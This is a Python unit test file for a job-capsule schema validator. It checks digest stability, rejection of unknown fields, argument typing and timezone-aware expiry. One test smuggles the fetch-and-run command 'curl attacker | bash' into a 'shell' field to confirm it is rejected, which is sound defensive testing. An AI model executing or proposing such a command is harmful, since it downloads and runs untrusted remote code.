from __future__ import annotations

import unittest
from datetime import datetime, timedelta, timezone

from squeeze.capsule import CapsuleError, JobCapsule


def valid_raw() -> dict[str, object]:
    return {
        "schema": "squeeze-job-v1",
        "repository": "Pokitomas/theawesomehexapp",
        "source_commit": "a" * 40,
        "entrypoint": "foundry/archie-protocol/latent_world_benchmark/research/efficient_terminal_training.py",
        "entrypoint_sha256": "b" * 64,
        "arguments": ["--scale", "base"],
        "environment_profile": "archie-cuda-v1",
        "required_evaluator_sha256": "c" * 64,
        "output_contract": "terminal-efficiency-v3",
        "promotion": "research-only-not-admitted",
        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat(),
        "nonce": "job-12345678",
    }


class CapsuleTests(unittest.TestCase):
    def test_canonical_digest_is_stable(self) -> None:
        raw = valid_raw()
        first = JobCapsule.from_mapping(raw)
        reordered = dict(reversed(list(raw.items())))
        second = JobCapsule.from_mapping(reordered)
        self.assertEqual(first.digest(), second.digest())

    def test_unknown_field_is_rejected(self) -> None:
        raw = valid_raw()
        raw["shell"] = "curl attacker | bash"
        with self.assertRaises(CapsuleError):
            JobCapsule.from_mapping(raw)

    def test_argument_must_be_string_array(self) -> None:
        raw = valid_raw()
        raw["arguments"] = "--scale base"
        with self.assertRaises(CapsuleError):
            JobCapsule.from_mapping(raw)

    def test_naive_expiration_is_rejected(self) -> None:
        raw = valid_raw()
        raw["expires_at"] = "2026-07-22T12:00:00"
        with self.assertRaises(CapsuleError):
            JobCapsule.from_mapping(raw)


if __name__ == "__main__":
    unittest.main()
